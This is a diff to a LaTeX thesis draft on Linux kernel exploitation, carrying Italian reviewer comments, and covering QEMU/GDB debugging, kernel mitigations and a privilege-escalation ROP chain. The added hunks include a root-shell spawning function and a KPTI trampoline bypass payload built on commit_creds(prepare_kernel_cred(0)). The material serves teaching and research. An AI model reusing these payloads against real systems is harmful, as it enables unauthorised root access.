@@ -77,16 +77,17 @@ In fact, most \emph{Instruction Set Architectures} (ISA) supply at least two mod
 Furthermore, the kernel protects itself from user applications by realizing separation at the software level.
 When we have to set up the virtual memory subsystem, the kernel makes it possible to access the address space (i.e., the range of virtual memory addresses) of any process, and no process can directly refer to the kernel memory.
 
-The reference to\glnote{We will call\ldots ?} the memory visible only to the kernel as \emph{kernel-land} memory and the memory a user process sees as \emph{user-land} memory.\glnote{ho aggiunto emph; forse si può dire, più in generale, che chiamiamo ``user-land'' la parte di sistema vista da un processo utente, etc etc}
+The reference to\glnote{We will call\ldots ?} the memory visible only to the kernel as \emph{kernel-land} memory and the memory a user process sees as \emph{user-land} memory. The term user-land refers to all code that runs outside the operating system's kernel. User-land usually refers to the various programs and libraries that the operating system uses to interact with the kernel\glnote{ho aggiunto emph; forse si può dire, più in generale, che chiamiamo ``user-land'' la parte di sistema vista da un processo utente, etc etc}
 Code executing in kernel-land runs with full privileges and can access any valid memory address on the system, while code executing in user-land is subject to all limits as describe above. This separation between hardware- and software-based\glnote{non capisco il discorso hw- sw-based} is necessary to protect the kernel from accidental damage or alteration resulting from a misbehaving or malicious user-land application.
 
 \chapter{Art of Exploitation}
 \label{ch:exploitation}
 
 There are various ways an attacker can behave as a \emph{super-user}, the most excitement is generally performed with the development of an exploit.\glnote{non capisco la frase}
+\vtnote{Forse mi sono spiegato male....There are various ways an attacker can gain root privileges, ...}
 The meaning behind \emph{exploitation} is really simple: software has bugs, and these make the software work not correctly, or otherwise perform incorrectly a task that had to perform in an appropriate way.
 And all this means an advantage for the \emph{attacker}. Not every bug is exploitable; we refer to those that are as \emph{vulnerabilities}.
-Analyzing an application to establish its vulnerability is called \emph{AUDITING}\glnote{non urlare ;-) ... usa emph e basta, non tutto in maiuscolo}. It entails:
+Analyzing an application to establish its vulnerability is called \emph{auditing}\glnote{non urlare ;-) ... usa emph e basta, non tutto in maiuscolo}\vtnote{XD}. It entails:
 \begin{itemize}
 \item \emph{Reading} the source code of the application, if available;
 \item \emph{Reversing} the application binary; that is, reading the disassembly of the compiled code
@@ -97,16 +98,24 @@ Analyzing an application to establish its vulnerability is called \emph{AUDITING
 \label{sect:land}
 
 Until now the kernel has been described as the entity through which many countermeasures against exploitation are realized.\glnote{???}
+\vtnote{non sapevo come introdurre il capitolo}
 With the large diffusion of security patches and the contemporary reduction of user-land vulnerabilities, the attention of exploits writers has gone toward the core of the operating system.
 However, writing a \emph{kernel-land exploit} presents various extra challenges if compared to a user-land exploit:
 \begin{itemize}
 \item The kernel is the only piece of software that is strictly for the system. As long as the kernel works correctly, there is no incorrigible situation.
 This explains why user-land brute forcing, for example, is a feasibly choice: the only real worry we have to confront when we repeatedly crash our victim application is the noise we might create in the logs.
-When it comes to the kernel, this hypothesis isn't\glnote{nel linguaggio formale, come quello di una tesi, non usare mai le contrazioni; in questo caso: ``is not'' (cambia ovunque)} true anymore: an error at the kernel level leaves the system in an \emph{inconsistent state}, and it's usually required to take back the machine to its appropriate functioning.
+When it comes to the kernel, this hypothesis is not\glnote{nel linguaggio formale, come quello di una tesi, non usare mai le contrazioni; in questo caso: ``is not'' (cambia ovunque)} true anymore: an error at the kernel level leaves the system in an \emph{inconsistent state}, and it is usually required to take back the machine to its appropriate functioning.
  If the error happens inside one of the sensible areas of the kernel, the operating system will just shut down, a condition known as panic.
 \item The kernel is protected from user-land via both software and hardware. Finding information about the kernel is a much more difficult job. At the same time, the number of variables that are no more under the attacker’s control intensifies in an exponentially way. For example, let's consider the \emph{memory allocator}.
-In a user-land exploit, the allocator is inside the process, generally connected through a shared system library. Your purpose is its only consumer and its only \emph{affecter}\glnote{non capisco la frase}. On the other side, all the processes on the system may concern the behavior and the status of a kernel memory allocator.
-\item The kernel is a large and complex system. The dimension of the kernel is substantive, maybe on the order of millions of lines of source code\glnote{metti il numero di linee del kernel attuale; forse ci potrebbe stare bene anche un grafico di come è cresciuto negli anni, se si trova (mi sembra di aver visto qualcosa in giro)}. The kernel has to control all the hardware on the computer and most of the lower-level software
+In a user-land exploit, the allocator is inside \emph{the process}, generally connected through a shared system library. Your purpose is its only consumer and its only \emph{affecter}\glnote{non capisco la frase}\vtnote{Per questa sezione ho preso spunto da "a guide to kernel exploit"...}. On the other side, all the processes on the system may concern the behavior and the status of a kernel memory allocator.
+\item The kernel is a large and complex system. The dimension of the kernel is substantive, maybe on the order of millions of lines of source code\glnote{metti il numero di linee del kernel attuale; forse ci potrebbe stare bene anche un grafico di come è cresciuto negli anni, se si trova (mi sembra di aver visto qualcosa in giro)}. 
+\begin{figure}[h!]
+   \makebox[\textwidth][c]{\includegraphics{images/linux-lines-code.png}}
+   \caption{Growth of Codebase Kernel Linux}
+   \label{graphview}
+\end{figure}
+
+The kernel has to control all the hardware on the computer and most of the lower-level software
 abstractions (virtual memory, file systems, IPC facilities, etc.). This implies many hierarchical, interconnected subsystems that the attacker may have to deeply understand to successfully trigger and exploit a specific
 vulnerability. This characteristic can also become an advantage for the exploit developer, as a complex system is also less likely to be bug-free.
 \end{itemize}
@@ -119,7 +128,7 @@ vulnerability. This characteristic can also become an advantage for the exploit 
 \label{sect:debugging}
 
 In user space we had the support of the kernel so we could easily stop processes and use gdb to inspect their behavior.
-GDB(collegamento wiki)\glnote{collegamento wiki??? se vuoi mettere un collegamento, metti la pagina ufficiale di gdb} allows you to see what is going on \emph{inside} another program while it executes -- or what another program was doing at the moment it crashed.
+GDB(collegamento wiki)\glnote{collegamento wiki??? se vuoi mettere un collegamento, metti la pagina ufficiale di gdb}\vtnote{collegamento wiki intendo i riferimenti che devo fare con bibitex o a siti :D} allows you to see what is going on \emph{inside} another program while it executes -- or what another program was doing at the moment it crashed.
 \subsection{GDB}
 \label{subsect:gdb}
 GDB can do four main kinds of things to help you catch bugs in the act:
@@ -133,44 +142,59 @@ GDB can do four main kinds of things to help you catch bugs in the act:
 \glnote{Gira la frase: per poter debuggare un kernel, dobbiamo ricorrere a un hypervisor.... in realtà credo che tu possa anche usare un collegamento seriale e un altro PC; andrebbe detto (poi è scomodo e si usa QEMU, ovviamente} In the kernel, in order to use gdb we need to use hypervisor like QEMU based hardware interfaces which are not always available.
 The Linux kernel provides a set of tools and debug options useful for investigating abnormal behavior.
 
-\subsection{Setting\glnote{Running?} QEMU}
+\subsection{Running QEMU}
 \label{subsect:QEMU}
 As said previously, to debug the kernel we need the qemu hypervisor. Specifically, there are some options needed in kernel analysis:\glnote{usa un itemize per fare elenco puntato; alcune opzioni non mi sembra che siano per l'analisi, ma semplicemente per far partire un sistema linux sotto qemu}
-\lstinline{-kernel <path>}, (where <path> means the) Path to kernel image to debug;
-\lstinline{-initrd <path>}, Path to initial Ram disk. In short, a RAM disk is a filesystem dynamically placed in you RAM memory in boot time that contains the basic stuff needed to get your real filesystem running with the first processes needed to get your whole system running as expected, like the init process;
-\lstinline{-gdb dev}, wait for gdb connection on device dev. Typical connections will likely be TCP-based, but also UDP, pseudo TTY, or even stdio are reasonable use case;
-\lstinline{-s}, shorthand for -gdb tcp::1234, i.e. open a gdbserver on TCP port 1234;
-\lstinline{-S}, freeze the CPU on startup;
-\lstinline{-cpu model}, select CPU model. Here we can add +smep and +smap for SMEP and SMAP mitigation features;
-\lstinline{-m [size=]megs}, set virtual RAM size to megs megabytes;
-\lstinline{-append}, specifies additional boot options. This is also where we can enable/disable mitigation features.
+\vtnote{potrei dire....there are some options we need to run an operating system and analyze the kernel:}
+
+\begin{itemize}
+\item -kernel <path>, (where <path> means the) Path to kernel image to debug;
+\item -initrd <path>, Path to initial Ram disk. In short, a RAM disk is a filesystem dynamically placed in you RAM memory in boot time that contains the basic stuff needed to get your real filesystem running with the first processes needed to get your whole system running as expected, like the init process;
+\item -gdb dev , wait for gdb connection on device dev. Typical connections will likely be TCP-based, but also UDP, pseudo TTY, or even stdio are reasonable use case;
+\item -s, shorthand for -gdb tcp::1234, i.e. open a gdbserver on TCP port 1234;
+\item -S, freeze the CPU on startup;
+\item -cpu model, select CPU model. Here we can add +smep and +smap for SMEP and SMAP mitigation features;
+\item -m [size=]megs, set virtual RAM size to megs megabytes;
+\item -append, specifies additional boot options. This is also where we can enable/disable mitigation features.
+\end{itemize}
 These options are essential for analyzing the kernel. But qemu supports other options (indicate the documentation site) which may be useful for running the system and to help the user in the analysis.
 
 
 \chapter{Kernel configuration}
 \label{ch:kernel-configuration}
 \glnote{dalle altre parti hai usato ``we''; vanno bene entrambi, tendenzialmente si usa ``we'', però l'importante è essere consistente}
-I recommended that you build and install your own kernel, rather than running the stock kernel that comes with your distribution. One of the strongest reasons for running your own kernel is that the kernel developers have built several debugging features into the kernel itself. These features can create extra output and slow performance, so they tend not to be enabled in production kernels from distributors.
+\vtnote{Sisi, controllo che non ci siano altri cambi di pronomi}
+We recommended that you build and install your own kernel, rather than running the stock kernel that comes with your distribution. One of the strongest reasons for running your own kernel is that the kernel developers have built several debugging features into the kernel itself. These features can create extra output and slow performance, so they tend not to be enabled in production kernels from distributors.
 
 When building a kernel for debugging with gdb, I would advise using the following configuration options to make debugging a bit more pleasant.
 
 Except where specified otherwise, all of these options are found under the \emph{``kernel hacking"} menu in whatever kernel configuration tool you prefer. Note that some of these options are not supported by all architectures and if it is addes, it is not considered for the building of kernel.
-\begin{itemize}
-\item CONFIG_GDB_SCRIPTS\glnote{usa lstlisting (da tutte le parti, la formattazione è tutta sbagliata)} adds links to the GDB helper scripts.I find it particularly useful when debugging a kernel module, when I need to inspect the kernel log buffer or VFS mounts.
-\item CONFIG_KGDB enables the built in kernel debugger, which allows for remote debugging. Technically this option is the only one that is strictly required, but attempting to debug without debug symbols will make debugging much harder.
-\item CONFIG_FRAME_POINTER inserts code to into the compiled executable which saves the frame information in registers or on the stack at different points.
-\item CONFIG_DEBUG_KERNEL makes other debugging options available.
-\item CONFIG_DEBUG_SLAB turns on several types of checks in the kernel memory allocation functions; with these checks enabled, it is possible to detect a number of memory overrun and missing initialization errors.
-\item CONFIG_DEBUG_PAGEALLOC where full pages are removed from the kernel address space when freed. This option can slow things down significantly, but it can also quickly point out certain kinds of memory corruption errors.
-\item CONFIG_DEBUG_SPINLOCK allows to the kernel to catch operations on uninitialized spinlocks and various other errors.
-\item CONFIG_INIT_DEBUG where items marked with _ _init (or _ _initdata) are discarded after system initialization or module load time. This option enables checks for code that attempts to access initialization-time memory after initialization is complete.
-\item CONFIG_DEBUG_INFO causes the kernel to be built with full debugging information included. Including debug information in the kernel and kernel modules will make both the image and the modules larger in size.
-\item CONFIG_DEBUG_STACK_USAGE and CONFIG_DEBUG_STACKOVERFLOW to check the overflows of kernel, IRQ and exception stacks. This option will cause messages of the stacks in detail when free stack space drops below a certain limit.
-A sure sign of a stack overflow is an \emph{oops}[cit]listing without any sort of reasonable back trace. The first option adds explicit overflow checks to the kernel; the second causes the kernel to monitor stack usage and make some statistics available via the magic SysRq key.
-\item CONFIG_KALLSYMS causes kernel symbol information to be built into the kernel; it is enabled by default. The symbol information is used in debugging contexts; without it, an oops listing can give you a kernel traceback only in hexadecimal, which is not very useful.
-\item CONFIG_IKCONFIG and CONFIG_IKCONFIG_PROC
-These options(found in the "General setup" menu)  cause the full kernel configuration state to be built into the kernel and to be made available via /proc. Most kernel developers know which configuration they used and do not need these options (which make the kernel bigger). They can be useful, though, if you are trying to debug a problem in a kernel built by somebody else.
-\end{itemize}
+\glnote{usa lstlisting (da tutte le parti, la formattazione è tutta sbagliata)}
+\begin{lstlisting}
+CONFIG_GDB_SCRIPTS adds links to the GDB helper scripts.I find it particularly useful when debugging a kernel module, when I need to inspect the kernel log buffer or VFS mounts.
+
+CONFIG_KGDB enables the built in kernel debugger, which allows for remote debugging. Technically this option is the only one that is strictly required, but attempting to debug without debug symbols will make debugging much harder.
+CONFIG_FRAME_POINTER inserts code to into the compiled executable which saves the frame information in registers or on the stack at different points.
+
+CONFIG_DEBUG_KERNEL makes other debugging options available.
+
+CONFIG_DEBUG_SLAB turns on several types of checks in the kernel memory allocation functions; with these checks enabled, it is possible to detect a number of memory overrun and missing initialization errors.
+
+CONFIG_DEBUG_PAGEALLOC where full pages are removed from the kernel address space when freed. This option can slow things down significantly, but it can also quickly point out certain kinds of memory corruption errors.
+
+CONFIG_DEBUG_SPINLOCK allows to the kernel to catch operations on uninitialized spinlocks and various other errors.
+
+CONFIG_INIT_DEBUG where items marked with _ _init (or _ _initdata) are discarded after system initialization or module load time. This option enables checks for code that attempts to access initialization-time memory after initialization is complete.
+
+CONFIG_DEBUG_INFO causes the kernel to be built with full debugging information included. Including debug information in the kernel and kernel modules will make both the image and the modules larger in size.
+
+CONFIG_DEBUG_STACK_USAGE and CONFIG_DEBUG_STACKOVERFLOW to check the overflows of kernel, IRQ and exception stacks. This option will cause messages of the stacks in detail when free stack space drops below a certain limit.
+A sure sign of a stack overflow is an oops[cit]listing without any sort of reasonable back trace. The first option adds explicit overflow checks to the kernel; the second causes the kernel to monitor stack usage and make some statistics available via the magic SysRq key.
+
+CONFIG_KALLSYMS causes kernel symbol information to be built into the kernel; it is enabled by default. The symbol information is used in debugging contexts; without it, an oops listing can give you a kernel traceback only in hexadecimal, which is not very useful.
+
+CONFIG_IKCONFIG and CONFIG_IKCONFIG_PROC (found in the "General setup" menu) cause the full kernel configuration state to be built into the kernel and to be made available via /proc. Most kernel developers know which configuration they used and do not need these options (which make the kernel bigger). They can be useful, though, if you are trying to debug a problem in a kernel built by somebody else.
+\end{lstlisting}
 
 If you don’t want to use menuconfig is possible to set configuration options via command line using the following
 \lstinline{$ ./scripts/config -e CONFIG_<your option>} .\\
@@ -185,7 +209,7 @@ Before starting the VM and attempting to attach gdb, set up gdb to load the Linu
 \label{sect:like userland}
 Just like mitigation features such as ASLR, stack canaries, PIE, etc. used by userland programs, kernel also have their own set of mitigation features. Below are some of the popular and notable Linux kernel mitigation features.
 
-\subsection{Kernel stack cookies}:
+\subsection{Kernel stack canary}:
 \label{subsect:canary}
 \glnote{nel titolo usi cookie, ma poi parli di canary\ldots}
 Stack canaries are a mitigation targeted at stack-based buffer overflow attacks. It works by exploiting one of the limitations of these kind of attacks, namely, that the attacker must overwrite all the bytes between the overflown buffer and the control data (i.e., saved registers and the return address). The idea is to put a value—the canary—between the local variables and the control data of each function stack frame. The attacker, thus, has to overwrite the canary before she can overwrite the control data. If overwriting the canary is impossible or can be detected, the attack is blocked.
@@ -215,6 +239,8 @@ Complementing SMEP, this feature marks all the userland pages in the page table 
 \subsection{Kernel page-table isolation}
 \label{subsect:KPTI}
 Kernel page-table isolation (KPTI or PTI,previously called KAISER) is a Linux kernel feature improves kernel hardening against attempts to bypass kernel address space layout randomization (KASLR). It works by better isolating user space and kernel space memory.\glnote{è stata introdotta contro Meltdown, se non vado errato; andrebbe detto}
+\glnote{l'ho citata nell'exploit, ma lo posso dire qui}
+This mitigation was added to avoid the \emph{Meltdown} (wiki).
 When this feature is active, the kernel separates user-space and kernel-space page tables entirely, instead of using just one set of page tables that contains both user-space and kernel-space addresses. One set of page tables includes both kernel-space and user-space addresses same as before, but it is only used when the system is running in kernel mode. The second set of page tables for use in user mode contains a copy of user-space and a minimal set of kernel-space addresses.
 
 \subsection{Function Granular Kernel Address Space Layout Randomization}
@@ -226,9 +252,11 @@ code text as a unit at boot time in order to make addresses less predictable.
 The order of the code within the segment is unchanged - only the base address is shifted. There are a few shortcomings to this algorithm.
 
 \glnote{usa enumerate per gli elenchi numerati}
-1. Low Entropy - there are only so many locations the kernel can fit in. This means an attacker could guess without too much trouble.
-2. Knowledge of a single address can reveal the offset of the base address, exposing all other locations for a published/known kernel image.
-3. Info leaks abound.
+\begin{enumerate}
+\item Low Entropy - there are only so many locations the kernel can fit in. This means an attacker could guess without too much trouble.
+\item Knowledge of a single address can reveal the offset of the base address, exposing all other locations for a published/known kernel image.
+\item Info leaks abound.
+\end{enumerate}
 
 Finer grained ASLR has been proposed as a way to make ASLR more resistantto info leaks. It is not a new concept at all, and there are many variations possible. Function reordering is an implementation of finer grained ASLR which randomizes the layout of an address space on a function level granularity.
 
@@ -396,6 +424,16 @@ This is not always the case, it depends on the kernel in use, in fact very impor
 The above code, entering 8 in rdx ignores the jne instruction, allows you to write the rax value in rdi that will be used for the commit_creds function (prepare_kernel_cred (0))
 While ROPgadget can find swapgs, it doesn't find iretq, so we use objdump to find the right address and be able to write the full ROP chain.
 \begin{lstlisting}
+void get_shell(void){
+    puts("[*] Returned to userland");
+    if (getuid() == 0){
+        printf("[*] UID: %d, got root!\n", getuid());
+        system("/bin/sh");
+    } else {
+        printf("[!] UID: %d, didn't get root\n", getuid());
+        exit(-1);
+    }
+}
 unsigned long user_rip = (unsigned long)get_shell;
 
 unsigned long pop_rdi_ret = 0xffffffff81006370;
@@ -435,13 +473,53 @@ void overflow(void){
 }
 
 \end{lstlisting}
-
-
-
-
-
 \section{Adding KPTI}
+\label{sect:trampoline}
+As mentioned in the paragraph (quote the part with ktpi) the user-space and kernel-space page tables are separate. In fact, in user mode, a page set includes user-space page tables and only a few kernel-space addresses.
+There are several ways to bypass this mitigation, but the one we're going to look at is called a \emph{trampoline}.
+Logically if a system call returns normally there must be a piece of code in the kernel that swaps the page tables to the userland, so we will try to reuse that code for our purpose.
+This piece of code is called a trampoline and swaps the page tables, swapgs, and iretq.
+\section{Tweaking the ROP chain}
+The piece of code resides in a function called \lstinline{swapgs_restore_regs_and_return_to_usermode()} which we always find with \lstinline{/proc/kallsyms}.
+\begin{lstlisting}
+.text:FFFFFFFF81200F10                 pop     r15
+...
+.text:FFFFFFFF81200F26                 mov     rdi, rsp
+.text:FFFFFFFF81200F29                 mov     rsp, qword ptr gs:unk_6004
+.text:FFFFFFFF81200F32                 push    qword ptr [rdi+30h]
+.text:FFFFFFFF81200F35                 push    qword ptr [rdi+28h]
+.text:FFFFFFFF81200F38                 push    qword ptr [rdi+20h]
+.text:FFFFFFFF81200F3B                 push    qword ptr [rdi+18h]
+.text:FFFFFFFF81200F3E                 push    qword ptr [rdi+10h]
+.text:FFFFFFFF81200F41                 push    qword ptr [rdi]
+.text:FFFFFFFF81200F43                 push    rax
+.text:FFFFFFFF81200F44                 jmp     short loc_FFFFFFFF81200F89
+...
 
+.text:FFFFFFFF81200F89 loc_FFFFFFFF81200F89:
+.text:FFFFFFFF81200F89                               pop     rax
+.text:FFFFFFFF81200F8A                               pop     rdi
+.text:FFFFFFFF81200F8B                               call    cs:off_FFFFFFFF82040088
+.text:FFFFFFFF81200F91                               jmp     cs:off_FFFFFFFF82040080
+\end{lstlisting}
+Up to the address FFFFFFFF81200F26 the function makes a series of pop that free the stack, then you get to the part that swaps the tables of the page.
+We will have two extra pop at the beginning, then we will add two dummy values, and we will modify the final part of our ROP chain from \lstinline{SWAPGS|IRETQ|RIP|CS|RFLAGS|SP|SS)} to \lstinline{KPTI_trampoline|dummy RAX|dummy RDI|RIP|CS|RFLAGS|SP|SS}.
+\begin{lstlisting}
+void overflow(void){
+    // ...
+    payload[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0))
+    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
+    payload[off++] = 0x0; // dummy rax
+    payload[off++] = 0x0; // dummy rdi
+    payload[off++] = user_rip;
+    payload[off++] = user_cs;
+    payload[off++] = user_rflags;
+    payload[off++] = user_sp;
+    payload[off++] = user_ss;
+    // ...
+\end{lstlisting}
+This solution can be used regardless of whether KPTI is enabled or not.
+So, even if different from the one seen in the paragraph (subsection {Second scenario}), it can be used to bypass the SMEP.
 \section{Adding SMAP}
 
 \section{Adding KASLR and FG-KASLR}
